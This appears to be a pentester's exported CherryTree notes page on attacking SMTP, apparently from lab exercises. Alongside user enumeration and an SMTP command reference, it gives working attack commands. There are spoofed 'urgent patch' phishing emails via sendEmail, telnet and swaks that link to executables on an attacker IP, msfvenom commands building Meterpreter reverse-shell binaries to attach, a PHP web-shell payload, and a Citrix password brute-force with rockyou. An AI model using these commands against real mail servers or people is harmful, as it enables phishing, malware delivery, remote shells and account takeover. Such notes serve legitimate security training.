<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SMTP</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SMTP</h1><br/><p><strong><h2>Enumeration :</h2></strong></p><p><ul><li> alternative = /opt/smtp-user-enum-1.2 (kali)<ul><li>smtp-user-enum  -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt  -t $target</li><li> try -M RCPT / -M EXPN / -M VRFY</li></ul></li><li>nmap --script smtp-open-relay.nse -p 25 $target</li><li><span style="text-decoration:underline;">https://amolblog.com/25-tcp-open-smtp-postfix-smtpd-exploit/</span></li></ul></p><p><h2>SMTP commands</h2><ul><li>telnet  $target 25<ul><li>HELO</li><li> VRFY root ▪// <em>VRFY</em><h3> request asks the server to verify an email address, </h3></li><li>VRFY idontexist</li></ul></li></ul></p><p></p><p> </p><p><h2>send message  example</h2></p><p><div class="codebox"><pre>sendEmail -t [target_user_email] -f [sender_email] -u [Subject of email] -a [the attachment file] -s [smtp_server] -m <span style="color:#3ad900;font-weight:400">&quot;[message in here]&quot;</span> -xu [smtp_user] -xp <span style="color:#3ad900;font-weight:400">&quot;[smtp_password]&quot;</span><br /><br /><br />sendEmail -t dave.wizard@supermagicorg.com  -f test@supermagicorg.com -u test -a ./config.Library-ms -m <span style="color:#3ad900;font-weight:400">&quot;hi there, nice to meet you&quot;</span> -xu <span style="color:#3ad900;font-weight:400">&quot;test@supermagicorg.com&quot;</span> -xp <span style="color:#3ad900;font-weight:400">&quot;test&quot;</span> -s <span style="color:#7f0044;font-weight:400">$target</span> -v</pre></div></p><p><ul><li></li><li> example code execution</li></ul></p><p> ◇ ▪  data : &lt;?php echo system($_REQUEST[&quot;cmd&quot;]); ?&gt;</p><p> </p><p> </p><p> </p><p></p><p> </p><p><h2> send message with telnet if sendEmail isn&#39;t enough</h2></p><p> * === telnet </p><p></p><p>Helo</p><p></p><p>Mail From:rmurray@victim</p><p>RCPT To:tharper@victim</p><p>data</p><p></p><p>Subject: Urgent Patch</p><p>Hi, </p><p>Please install this urgent patch,</p><p><a href="http://192.168.119.127:1234/Patch.exe">http://192.168.119.127:1234/Patch.exe</a></p><p>.</p><p></p><p> </p><p></p><p> <h2> ENUM users  with the smtp-user-enum script</h2><ul><li>smtp-user-enum -U /usr/share/service-accounts.txt -D humongousretail.com -t 10.13.38.12 -vv -M RCPT | grep &quot;exists&quot;</li><li>bruteforce passwords with nmap</li></ul></p><p> ◇ ▪ nmap --script=citrix-brute-xml --script-args=userdb=emails.txt,passdb=/usr/share/wordlists/rockyou.txt,ntdomain=humongousretail.com -p80 10.13.38.12</p><p> </p><p> </p><p> </p><p>  </p><p><h2> SWAKS : the smtp swiss army knife:</h2><ul><li> phishing<ul><li> swaks --body &#39;&lt;html&gt;&lt;a href=&quot;http://10.14.14.3/nano&quot;&gt;Citrix team&lt;/a&gt;&lt;/html&gt;&#39;  --add-header &quot;MIME-Version: 1.0&quot; --add-header &quot;Content-Type: text/html&quot; --header &quot;Subject: Test mail&quot; -t sales@humongousretail.com -f it@humongousretail.com </li><li>-f &lt;from_mail&gt;  -t &lt;to_mail&gt;</li><li>setup webmail server on 10.14.14.3</li></ul></li></ul></p><p> </p><p></p><p></p><p></p><p> <h3>Note : there are soma mail servers  that allow advanced commands </h3></p><p> </p><p> </p><p> </p><p><h2> O exercieses solutioons</h2></p><p>sendEmail -f olynch@victim -t lhale@victim -u &quot;job application: &quot; -m &quot;job application: <a href="http://192.168.119.127:9001">http://192.168.119.127:9001</a>&quot;  -s $target -v</p><p></p><p></p><p></p><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.127 LPORT=4444 -f exe &gt;shell.exe<ul><li>set payload windows/meterpreter/reverse_tcp</li></ul></p><p></p><p>sendEmail -f rmurray@victim -t tharper@victim -u &quot;urgent patch &quot; -m &quot;urgent patch&quot; -a shell.exe -s $target -v</p><p></p><p>sendEmail -f rmurray@victim -t tharper@victim -u &quot;urgent patch&quot; -m &quot;urgent patch : <a href="http://192.168.119.127:1234/shell.exe">http://192.168.119.127:1234/shell.exe</a>&quot;  -s $target -v</p><p></p><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=1234 -f exe -o test.exe</p><p></p><p></p><p></p><p><strong><h2>SMTP known vulns</h2></strong><ul><li>shellshock<ul><li><a href="https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py">https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py</a></li><li>need a valid email</li></ul></li></ul></p><p></p><p></p><p></p><p><h2>SMTP all commands </h2></p><p></p><p><div class="codebox"><pre>HELO - <br />EHLO - Extended SMTP.<br />STARTTLS - SMTP communicted over unencrypted protocol. By starting TLS-session we encrypt the traffic.<br />RCPT - Address of the recipient.<br />DATA - Starts the transfer of the message contents.<br />RSET - Used to abort the current email transaction.<br />MAIL - Specifies the email address of the sender.<br />QUIT - Closes the connection.<br />HELP - Asks for the help screen.<br />AUTH - Used to authenticate the client to the server.<br />VRFY - Asks the server to verify is the email user<span style="color:#3ad900;font-weight:400">&#39;s mailbox exists.</span></pre></div></p><p></p><p></p><p><h2>SMTP user enum</h2></p><p></p><p><div class="codebox"><pre>smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t <span style="color:#7f0044;font-weight:400">$target</span></pre></div></p></div>
</body>
</html>
